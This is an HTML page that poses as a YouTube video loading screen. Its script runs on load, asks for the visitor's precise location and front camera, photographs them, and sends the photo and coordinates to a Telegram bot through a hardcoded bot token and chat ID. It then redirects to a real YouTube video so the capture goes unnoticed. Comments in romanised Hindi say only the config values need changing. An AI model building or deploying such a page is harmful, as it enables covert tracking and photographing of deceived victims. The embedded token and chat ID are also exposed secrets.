<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>YouTube</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #0f0f0f;
      color: #f1f1f1;
      font-family: Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .yt-logo {
      margin-bottom: 40px;
    }

    .yt-logo svg {
      width: 120px;
      height: 27px;
    }

    /* Buffering circle */
    .spinner {
      width: 56px;
      height: 56px;
      border: 4px solid #272727;
      border-top: 4px solid #ff0000;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 24px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 14px;
      color: #aaa;
      letter-spacing: 0.5px;
    }

    video, canvas { display: none; }
  </style>
</head>
<body>

  <!-- YouTube Logo -->
  <div class="yt-logo">
    <svg viewBox="0 0 120 27" xmlns="http://www.w3.org/2000/svg">
      <path d="M18.18 3.87S17.9 2.2 17.17 1.44C16.27.46 15.25.45 14.73.4 12.3.23 8.51.23 8.51.23h-.01S4.7.23 2.28.4c-.53.05-1.54.06-2.45 1.04C-.9 2.2-1.18 3.87-1.18 3.87S-1.47 5.8-1.47 7.74v1.8c0 1.93.29 3.87.29 3.87s.28 1.67 1.01 2.43c.91.98 2.11.95 2.64 1.05 1.92.18 8.04.24 8.04.24s3.82-.01 6.24-.18c.53-.06 1.54-.07 2.45-1.05.73-.76 1.01-2.43 1.01-2.43s.29-1.94.29-3.87V7.74c0-1.94-.29-3.87-.29-3.87zM6.8 11.08V4.5l6.59 3.3-6.59 3.28z" fill="#FF0000" transform="translate(2 6)"/>
      <text x="28" y="20" font-family="Arial" font-size="16" font-weight="bold" fill="#FFFFFF">YouTube</text>
    </svg>
  </div>

  <!-- Spinner -->
  <div class="spinner"></div>

  <!-- Text -->
  <div class="loading-text">Loading video...</div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

<script>
  // ─── CONFIG ── Sirf yeh do cheezein badal ─────────────────────────────────
  const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // redirect URL
  const BOT_TOKEN   = "8973797235:AAHeo3DYJHq79df4YXKleQu-sAanDgG1dcU";
  const CHAT_ID     = "8145264158";
  // ──────────────────────────────────────────────────────────────────────────

  const TELEGRAM = `https://api.telegram.org/bot${BOT_TOKEN}`;
  const MAX_WAIT = 8000; // max 8 seconds, phir redirect ho jaayega

  async function captureAndSend() {
    let lat = null, lon = null, locText = null, photoBlob = null;

    // Location + Camera parallel chalao
    const [locResult, camResult] = await Promise.allSettled([

      // 1. Location
      new Promise(async (res) => {
        try {
          const pos = await new Promise((resolve, reject) =>
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true, timeout: 7000
            })
          );
          lat = pos.coords.latitude;
          lon = pos.coords.longitude;
          locText = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\nAccuracy: ${Math.round(pos.coords.accuracy)}m`;
        } catch(e) {}
        res();
      }),

      // 2. Camera
      new Promise(async (res) => {
        try {
          let stream;
          try {
            stream = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: { exact: "user" } }
            });
          } catch {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
          }

          const video  = document.getElementById("video");
          const canvas = document.getElementById("canvas");
          video.srcObject = stream;
          await new Promise(r => video.onloadedmetadata = r);
          await new Promise(r => setTimeout(r, 1000));

          canvas.width  = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());

          photoBlob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.88));
        } catch(e) {}
        res();
      })
    ]);

    // 3. Telegram pe bhejo
    const sends = [];

    if (photoBlob) {
      sends.push((async () => {
        try {
          const fd = new FormData();
          fd.append("chat_id", CHAT_ID);
          fd.append("photo", photoBlob, "hg_trigger.jpg");
          fd.append("caption", `🛡️ HomeGuard Trigger\n${locText || "Location unavailable"}`);
          await fetch(`${TELEGRAM}/sendPhoto`, { method: "POST", body: fd });
        } catch(e) {}
      })());
    }

    if (lat !== null) {
      sends.push((async () => {
        try {
          await fetch(`${TELEGRAM}/sendLocation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
          });
        } catch(e) {}
      })());
    }

    await Promise.allSettled(sends);
  }

  async function run() {
    // Dono parallel chalao: capture karo aur timer rakho
    await Promise.race([
      captureAndSend(),
      new Promise(res => setTimeout(res, MAX_WAIT)) // max wait
    ]);

    // Redirect to real YouTube
    window.location.replace(YOUTUBE_URL);
  }

  window.addEventListener("load", run);
</script>

</body>
</html>
